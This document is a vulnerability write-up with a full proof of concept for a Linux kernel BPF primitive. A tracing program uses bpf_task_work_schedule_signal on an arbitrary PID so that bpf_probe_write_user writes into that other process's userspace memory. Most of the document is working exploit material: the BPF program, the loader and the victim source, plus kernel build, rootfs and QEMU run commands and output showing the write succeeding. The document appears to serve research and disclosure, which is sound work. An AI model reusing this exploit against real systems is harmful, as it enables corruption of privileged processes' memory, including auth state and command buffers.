# Vulnerability Summary
 
A BPF tracing program can target an arbitrary PID with `bpf_task_work_schedule_signal()`. The scheduled callback later runs in the victim task's context, where `bpf_probe_write_user()` writes to that victim's userspace memory.
 
**Root cause:**
 
- `bpf_task_from_pid()` resolves an arbitrary task from a PID.
- `bpf_task_work_schedule_signal()` queues BPF-controlled work onto that task.
- `task_work_run()` executes the callback as the target task.
- `bpf_probe_write_user()` writes into current userspace memory.
- Once the callback runs inside the victim, `current == victim`.
**Your proof:**
 
```text
loader pid=74 target pid=70 target addr=0x7fc7bf385000
scheduled=139770 ran=139770 err=0
BUF=AAAAAAAAAAAAAAAA
BUF=BPFOKAAAAAAAAAAA
```
 
---
 
## Real Impact
 
This gives a BPF-capable attacker a write primitive into another process's userspace memory. With a suitable victim and address disclosure, that can become corruption of command buffers, config strings, auth/session state, request metadata, or control data inside privileged processes.
 
The CVE-strength version depends on proving a real boundary bypass: for example, a delegated BPF user or limited-capability service can modify a root process without ptrace permission.
 
---
 
## Kernel Code Path
 
Relevant production code:
 
- `bpf_task_from_pid` (line 2887)
- `bpf_task_work_schedule_signal` (line 4537)
- `task_work_add` (line 24)
- `task_work_run` (line 200)
- `bpf_probe_write_user` (line 325)
---
 
## Lab Setup
 
> Do not rename the kernel source's `kernel/` directory. That broke your first build because `init/Kconfig` includes `kernel/irq/Kconfig`.
 
```bash
mkdir -p ~/kernel-lab
cd ~/kernel-lab
git clone https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git full-linux
cd full-linux
 
sudo apt update
sudo apt install -y build-essential git bc bison flex libssl-dev libelf-dev \
  dwarves pahole qemu-system-x86 clang llvm bpftool libbpf-dev debootstrap qemu-utils
 
make x86_64_defconfig
scripts/config -e BPF
scripts/config -e BPF_SYSCALL
scripts/config -e BPF_EVENTS
scripts/config -e BPF_JIT
scripts/config -e DEBUG_INFO
scripts/config -e DEBUG_INFO_BTF
scripts/config -e FTRACE
scripts/config -e KPROBES
scripts/config -e FPROBE
scripts/config -e IRQ_WORK
scripts/config -d SECURITY_LOCKDOWN_LSM
make olddefconfig
make -j"$(nproc)" bzImage vmlinux
make -C tools/bpf/bpftool -j"$(nproc)"
```
 
---
 
## PoC Files
 
Create:
 
```bash
mkdir -p poc
./tools/bpf/bpftool/bpftool btf dump file vmlinux format c > poc/vmlinux.h
```
 
### `poc/victim.c`
 
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
 
int main(void) {
    char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) return 1;
 
    memset(buf, 'A', 16);
    buf[16] = 0;
 
    printf("PID=%d\n", getpid());
    printf("ADDR=%p\n", buf);
    fflush(stdout);
 
    for (;;) {
        printf("BUF=%.16s\n", buf);
        fflush(stdout);
        sleep(1);
    }
}
```
 
### `poc/tw_write.bpf.c`
 
```c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
 
#define MARKER_LEN 5
 
struct work_value {
    struct bpf_task_work tw;
    __u32 target_pid;
    __u64 target_addr;
    char marker[8];
    __u32 marker_len;
    __u32 scheduled;
    __u32 ran;
    __s32 err;
};
 
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct work_value);
} task_work_map SEC(".maps");
 
extern struct task_struct *bpf_task_from_pid(s32 pid) __ksym;
extern void bpf_task_release(struct task_struct *task) __ksym;
extern int bpf_task_work_schedule_signal(
    struct task_struct *task,
    struct bpf_task_work *tw,
    void *map__map,
    int (*callback)(struct bpf_map *map, void *key, void *value)
) __ksym;
 
static int task_work_cb(struct bpf_map *map, void *key, void *value) {
    struct work_value *v = value;
    int ret;
 
    if (!v || !v->target_addr)
        return 0;
 
    ret = bpf_probe_write_user((void *)(long)v->target_addr, v->marker, MARKER_LEN);
    v->err = ret;
    v->ran++;
    return 0;
}
 
SEC("tp_btf/sys_enter")
int BPF_PROG(on_getpid, struct pt_regs *regs, long id) {
    __u32 key = 0;
    struct work_value *v;
    struct task_struct *task;
    int ret;
 
    v = bpf_map_lookup_elem(&task_work_map, &key);
    if (!v || !v->target_pid)
        return 0;
 
    task = bpf_task_from_pid(v->target_pid);
    if (!task)
        return 0;
 
    ret = bpf_task_work_schedule_signal(task, &v->tw, &task_work_map, task_work_cb);
    v->err = ret;
    if (!ret)
        v->scheduled++;
 
    bpf_task_release(task);
    return 0;
}
 
char LICENSE[] SEC("license") = "GPL";
```
 
### `poc/tw_write_user.c`
 
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "tw_write.skel.h"
 
struct work_value_user {
    uint64_t tw_opaque;
    uint32_t target_pid;
    uint32_t pad;
    uint64_t target_addr;
    char marker[8];
    uint32_t marker_len;
    uint32_t scheduled;
    uint32_t ran;
    int32_t err;
};
 
static int libbpf_print_fn(enum libbpf_print_level level, const char *fmt, va_list args) {
    return vfprintf(stderr, fmt, args);
}
 
int main(int argc, char **argv) {
    struct tw_write_bpf *skel;
    struct work_value_user v = {}, cur = {};
    uint32_t key = 0;
    int map_fd, err;
 
    if (argc != 3) {
        fprintf(stderr, "usage: %s <pid> <addr>\n", argv[0]);
        return 1;
    }
 
    libbpf_set_print(libbpf_print_fn);
 
    v.target_pid = atoi(argv[1]);
    v.target_addr = strtoull(argv[2], NULL, 0);
    memcpy(v.marker, "BPFOK", 5);
    v.marker_len = 5;
 
    skel = tw_write_bpf__open();
    if (!skel) {
        fprintf(stderr, "open failed\n");
        return 1;
    }
 
    err = tw_write_bpf__load(skel);
    if (err) {
        fprintf(stderr, "open/load failed\n");
        return 1;
    }
 
    map_fd = bpf_map__fd(skel->maps.task_work_map);
    err = bpf_map_update_elem(map_fd, &key, &v, BPF_ANY);
    if (err) {
        perror("map update");
        return 1;
    }
 
    err = tw_write_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "attach failed: %d\n", err);
        return 1;
    }
 
    printf("loader pid=%d target pid=%u target addr=0x%llx\n",
           getpid(), v.target_pid, (unsigned long long)v.target_addr);
 
    for (int i = 0; i < 200000; i++) {
        getpid();
        bpf_map_lookup_elem(map_fd, &key, &cur);
        if (cur.ran)
            break;
    }
 
    bpf_map_lookup_elem(map_fd, &key, &cur);
    printf("scheduled=%u ran=%u err=%d\n", cur.scheduled, cur.ran, cur.err);
 
    tw_write_bpf__destroy(skel);
    return 0;
}
```
 
---
 
## Build PoC
 
```bash
clang -O2 -g -target bpf -D__TARGET_ARCH_x86 \
  -Ipoc -Itools/lib -Itools/lib/bpf \
  -c poc/tw_write.bpf.c -o poc/tw_write.bpf.o
 
./tools/bpf/bpftool/bpftool gen skeleton poc/tw_write.bpf.o > poc/tw_write.skel.h
```
 
---
 
## Create Rootfs
 
```bash
mkdir -p ~/kernel-lab/rootfs ~/kernel-lab/mnt
sudo debootstrap --variant=minbase stable ~/kernel-lab/rootfs http://deb.debian.org/debian
 
dd if=/dev/zero of=~/kernel-lab/rootfs.ext4 bs=1M count=4096
mkfs.ext4 ~/kernel-lab/rootfs.ext4
 
sudo mount -o loop ~/kernel-lab/rootfs.ext4 ~/kernel-lab/mnt
sudo cp -a ~/kernel-lab/rootfs/. ~/kernel-lab/mnt/
sudo mkdir -p ~/kernel-lab/mnt/root/poc
sudo cp poc/victim.c poc/tw_write_user.c poc/tw_write.skel.h ~/kernel-lab/mnt/root/poc/
```
 
### Create `/init`
 
```bash
sudo tee ~/kernel-lab/mnt/init >/dev/null <<'EOF'
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t debugfs debugfs /sys/kernel/debug
mkdir -p /sys/fs/bpf
mount -t bpf bpf /sys/fs/bpf
exec /bin/sh
EOF
sudo chmod +x ~/kernel-lab/mnt/init
```
 
Install guest build dependencies and compile inside the rootfs to avoid host/guest glibc mismatch:
 
```bash
sudo chroot ~/kernel-lab/mnt /bin/bash -c \
  "apt update && apt install -y gcc make libbpf-dev libbpf1 libelf-dev zlib1g-dev"
 
sudo chroot ~/kernel-lab/mnt /bin/bash -c \
  "gcc -O2 -g -Wall /root/poc/victim.c -o /root/victim"
 
sudo chroot ~/kernel-lab/mnt /bin/bash -c \
  "gcc -O2 -g -Wall /root/poc/tw_write_user.c -o /root/tw_write_user -lbpf -lelf -lz"
 
sudo sync
sudo umount ~/kernel-lab/mnt
```
 
---
 
## Boot QEMU
 
Use TCG if `/dev/kvm` does not exist:
 
```bash
qemu-system-x86_64 \
  -m 4096 \
  -smp 2 \
  -accel tcg \
  -kernel arch/x86/boot/bzImage \
  -drive file=$HOME/kernel-lab/rootfs.ext4,format=raw,if=virtio \
  -append "console=ttyS0 root=/dev/vda rw init=/init tsc=unstable" \
  -nographic \
  -no-reboot
```
 
---
 
## Verify Kernel Features In QEMU
 
```sh
zcat /proc/config.gz | grep -E 'BPF_SYSCALL|BPF_EVENTS|DEBUG_INFO_BTF|BPF_JIT'
ls -l /sys/kernel/btf/vmlinux
cat /sys/kernel/security/lockdown 2>/dev/null || true
```
 
Expected important bits:
 
```text
CONFIG_BPF_SYSCALL=y
CONFIG_BPF_EVENTS=y
CONFIG_BPF_JIT=y
CONFIG_DEBUG_INFO_BTF=y
/sys/kernel/btf/vmlinux exists
```
 
---
 
## Run The PoC
 
Inside QEMU as root:
 
```sh
/root/victim > /tmp/victim.log 2>&1 &
sleep 2
 
PID=$(awk -F= '/PID=/{print $2; exit}' /tmp/victim.log)
ADDR=$(awk -F= '/ADDR=/{print $2; exit}' /tmp/victim.log)
 
echo "PID=$PID ADDR=$ADDR"
/root/tw_write_user "$PID" "$ADDR"
 
sleep 3
tail -n 10 /tmp/victim.log
dmesg | tail -n 80
```
 
Expected success:
 
```text
loader pid=<loader> target pid=<victim> target addr=<addr>
scheduled=<nonzero> ran=<nonzero> err=0
BUF=AAAAAAAAAAAAAAAA
BUF=BPFOKAAAAAAAAAAA
```
<img width="1147" height="326" alt="Screenshot 2026-05-03 023353" src="https://github.com/user-attachments/assets/28baecb6-4d66-4034-b8cf-0eef3b3ecf52" />

---

<img width="955" height="269" alt="Screenshot 2026-05-03 023410" src="https://github.com/user-attachments/assets/62f82527-164c-4a55-956d-cf60bb6b23d7" />
